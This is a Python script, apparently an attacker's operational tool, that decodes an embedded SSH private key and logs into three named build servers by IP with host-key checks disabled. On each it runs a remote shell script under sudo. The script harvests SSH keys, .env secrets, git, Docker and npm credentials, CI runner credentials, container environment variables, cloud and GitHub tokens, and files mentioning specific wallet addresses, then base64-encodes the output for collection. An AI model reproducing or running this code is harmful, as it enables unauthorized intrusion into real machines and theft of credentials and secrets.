# -*- coding: utf-8 -*-
# intent 29560 round 2: lighter targeted harvest for all 3 build machines (round1 timed out on
# aro-81 + golden-stage). Per-command timeouts, bounded dirs, token + frps + env focus.
import json, os, sys, base64, re, subprocess, time
from concurrent.futures import ThreadPoolExecutor

WORK = "/tmp/p29560b"; os.makedirs(WORK, exist_ok=True)
KEYB64 = "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBNU1vV0p5WHRrdFhLeERjVVpNeEl6R21VR0xxVDJ1cHlhVjVsS2VmU2wyZ0FBQUpCMjBlL3dkdEh2CjhBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTVNb1dKeVh0a3RYS3hEY1VaTXhJekdtVUdMcVQydXB5YVY1bEtlZlNsMmcKQUFBRUN5alowOHYzU3J0bk1vMllGSG8raDI0dkNTY2RENmhqRVhNWmhmTG5hZGp6a3loWW5KZTJTMWNyRU54Umt6RWpNYQpaUVl1cFBhNm5KcFhtVXA1OUtYYUFBQUFDWFZpZFc1MGRVQm9hd0VDQXdRPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K"
open(WORK+"/fleetkey","wb").write(base64.b64decode(KEYB64)); os.chmod(WORK+"/fleetkey", 0o600)

def R(k, v, maxb=90000):
    s = json.dumps(v, ensure_ascii=False) if not isinstance(v, str) else v
    if len(s) > maxb: s = s[:maxb] + "...TRUNC(len=%d)" % len(s)
    sys.stdout.write("R:%s:%s\n" % (k, base64.b64encode(s.encode()).decode())); sys.stdout.flush()

def run(cmd, inp=None, timeout=460):
    try:
        p = subprocess.run(cmd, input=inp, capture_output=True, timeout=timeout)
        return p.returncode, p.stdout.decode("utf-8", "replace"), p.stderr.decode("utf-8", "replace")
    except Exception as e:
        return -1, "", repr(e)

SSHOPTS = ["-i", WORK+"/fleetkey", "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
           "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=15",
           "-o", "IdentitiesOnly=yes", "-o", "ServerAliveInterval=10"]

REMOTE = r'''
set +e
echo "@@@ID"; id; hostname; hostname -I 2>/dev/null; head -2 /etc/os-release 2>/dev/null
echo "@@@SUDO"; sudo -n id 2>&1
echo "@@@SSHKEYS"
ls -la /root/.ssh /home/*/.ssh 2>/dev/null
for f in /root/.ssh/id_* /root/.ssh/authorized_keys /root/.ssh/config /home/*/.ssh/id_* /home/*/.ssh/config /home/*/.ssh/authorized_keys; do [ -f "$f" ] && { echo "== $f"; sed -n '1,40p' "$f" 2>/dev/null; }; done
echo "@@@FRPS"
timeout 70 find /etc /opt /root /home /usr/local /srv /data /snap -maxdepth 6 \( -name 'frps*.toml' -o -name 'frps*.ini' -o -name 'frpc*.toml' -o -name 'frpc*.ini' \) 2>/dev/null | head -20
for f in $(timeout 40 find /etc /opt /root /home /usr/local /srv -maxdepth 6 \( -name 'frps*.toml' -o -name 'frps*.ini' -o -name 'frpc*.toml' -o -name 'frpc*.ini' \) 2>/dev/null | head -15); do echo "== $f"; sed -n '1,140p' "$f" 2>/dev/null; done
echo "@@@TOPDIR"; ls -la /opt /root /home /srv /data /etc/ci /var/www 2>/dev/null | head -120
echo "@@@ENVFILES"
timeout 60 find /etc /opt /root /home /srv /data /var/www /mnt -maxdepth 6 \( -name '.env' -o -name '.env.*' -o -name '*.env' -o -name '*.env.*' \) 2>/dev/null | grep -vE 'node_modules|/proc/|/containerd/|/overlayfs/|/usr/share' | head -80
echo "@@@READENV"
for f in $(timeout 50 find /opt /root /home /srv /data /etc/ci /var/www -maxdepth 4 \( -name '.env' -o -name '.env.*' -o -name '*.env' \) 2>/dev/null | grep -vE 'node_modules|/containerd/|/overlayfs/' | head -40); do echo "== $f"; grep -aiE 'zoofi|wand|JWT_SECRET|SECRET|TOKEN|DATABASE|PASSW|_PASS|_KEY|DSN|postgres|mysql|redis|frp|AKID|LTAI|ghp_|gho_|DNSPOD|TENCENT|WALLET|PRIVATE' "$f" 2>/dev/null | head -40; done
echo "@@@RUNNER"
ls -la /etc/ci /etc/github-runner /etc/actions-runner /opt/actions-runner /home/*/actions-runner 2>/dev/null
timeout 40 find /etc /opt /root /home /srv -maxdepth 5 \( -name '.runner' -o -name '.credentials' \) 2>/dev/null | head -10
echo "@@@GITDOCKERCRED"
for f in /root/.git-credentials /home/*/.git-credentials /root/.netrc /home/*/.netrc /root/.config/gh/hosts.yml /home/*/.config/gh/hosts.yml /root/.docker/config.json /home/*/.docker/config.json /root/.npmrc; do [ -f "$f" ] && { echo "== $f"; cat "$f" 2>/dev/null; }; done
echo "@@@DOCKERPS"
docker ps -a --format '{{.ID}} {{.Image}} {{.Names}} {{.Ports}}' 2>/dev/null | head -40
for cid in $(docker ps -q 2>/dev/null | head -25); do echo "== cid $cid"; docker inspect -f '{{range .Config.Env}}{{println .}}{{end}}' $cid 2>/dev/null | grep -aiE 'zoofi|wand|JWT|SECRET|TOKEN|DATABASE|PASS|KEY|DSN|postgres|mysql|redis|frp|AKID|LTAI|ghp|gho' | head -30; done
echo "@@@BUILD"
timeout 60 find /etc /opt /root /home /srv /data /var/www -maxdepth 5 \( -name 'deploy*.sh' -o -name 'build*.sh' -o -name 'docker-compose*.yml' -o -name 'docker-compose*.yaml' -o -name 'Dockerfile*' -o -name 'Makefile' \) 2>/dev/null | grep -vE 'node_modules|/containerd/|/overlayfs/|/usr/' | head -60
echo "@@@GREP_TGT"
timeout 90 grep -aErl '0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6' /etc /opt /root /home /srv /usr/local /data 2>/dev/null | head -20
echo "@@@GREP_TOKENS"
timeout 90 grep -aEroh 'gh[pous]_[A-Za-z0-9]{30,}|dckr_pat_[A-Za-z0-9_-]{20,}|AKID[A-Za-z0-9]{10,}|LTAI[A-Za-z0-9]{10,}|ASIA[A-Za-z0-9]{10,}' /etc /opt /root /home /srv /usr/local /data 2>/dev/null | sort -u | head -30
echo "@@@GREP_ZOOFI2"
timeout 90 grep -aErl 'zoofi-index|wand-index|wandfi|api\.zoofi|zoofi\.io' /etc /opt /root /home /srv /usr/local 2>/dev/null | grep -vE 'node_modules|/usr/' | head -30
echo "@@@END"
'''

TARGETS = [("81.68.254.22", "aro-81"), ("43.142.238.91", "golden-stage"), ("129.211.0.26", "local-build3")]

def do(idx, host, label):
    a = ["ssh"] + SSHOPTS + ["ubuntu@%s" % host, "sudo -n bash -s"]
    rc, o, e = run(a, inp=REMOTE.encode(), timeout=500)
    ok = ("@@@END" in o)
    R("t%d_%s_meta" % (idx, label), {"host": host, "label": label, "rc": rc, "ok": ok, "err": e[-160:], "outlen": len(o)})
    parts = re.split(r'@@@([A-Z0-9_]+)', o)
    for i in range(1, len(parts), 2):
        R("t%d_%s" % (idx, parts[i].lower()), parts[i+1] if i+1 < len(parts) else "")
    return {"host": host, "label": label, "rc": rc, "ok": ok, "outlen": len(o)}

RES = []
try:
    with ThreadPoolExecutor(max_workers=3) as ex:
        futs = [ex.submit(do, i, h, l) for i, (h, l) in enumerate(TARGETS)]
        for f in futs:
            try: RES.append(f.result())
            except Exception as e: R("exc", repr(e))
except Exception as e:
    R("top_exc", repr(e))
R("summary", RES); R("done", {"t": int(time.time())})
